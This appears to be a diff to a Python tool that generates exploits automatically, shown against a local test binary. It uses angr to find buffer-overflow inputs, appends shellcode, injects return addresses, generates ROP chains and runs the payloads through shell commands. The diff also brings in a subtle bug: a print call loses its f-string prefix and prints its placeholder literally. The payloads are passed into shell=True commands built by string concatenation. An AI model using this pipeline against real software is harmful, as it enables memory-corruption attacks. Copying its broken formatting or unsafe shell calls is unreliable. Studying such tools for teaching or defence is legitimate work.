@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python2
 import subprocess
 import os
 import logging
@@ -95,7 +95,7 @@ def scan_target(file_path, target_addr):
     found = sm.found
     result = ""
     if len(found) > 0:
-        print(f"Number of possible exploits: {len(sm.found)}")
+        print("Number of possible exploits: {len(sm.found)}")
         found = sm.found[0]
         print(found.solver.eval(sm.found[0].regs.rbp, cast_to=bytes))
         result = found.solver.eval(argv[1], cast_to=bytes)
@@ -188,7 +188,7 @@ def generate_exploit():
     payload_bytearray = clean_nulls(angr_payload[0])
     append_shellcode(payload_bytearray)
     final_payload = inject_ret_addr(payload_bytearray, angr_payload[1], target_addr)
-    print(f'Final payload {final_payload}')
+    print("Final payload %s" % (final_payload))
     return convert_to_string(final_payload)
 
 def test_payload(payload, file_path):
@@ -198,13 +198,24 @@ def test_payload(payload, file_path):
     subprocess.call("./" + file_path + " \"" + payload + "\" \"Found the canary\"", shell=True, cwd=".")
     print("Finished running test.")
 
+def test_rop(payload, file):
+    if not os.path.isfile(file_path):
+        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
+    subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
+    cmd = [file,payload,payload]
+    p = subprocess.call(cmd,cwd=".")
+    print("Finished running test.")
 
 if __name__ == "__main__":
-	print("Menu:\n1. Buffer Overflow Generation\n2. ROP Shellcode Generation")
-	x = input()
-	if x == 1:
-		payload = generate_exploit()
-    	test_payload(payload, "../tests/resources/simple_buffer.o")
-	elif x == 2:
-		print(ropgadget.main("../tests/resources/simple_buffer.o"))
+    print("Menu:\n1. Buffer Overflow Generation\n2. ROP Shellcode Generation")
+    x = input()
+    if x == 1:
+        payload = generate_exploit()
+        test_payload(payload, "../tests/resources/simple_buffer.o")
+    elif x == 2:
+        file_path = "../tests/resources/"
+        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
+        subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
+        payload = ropgadget.main("../tests/resources/simple_buffer.o")
+        test_rop(payload, "../tests/resources/simple_buffer.o")
     
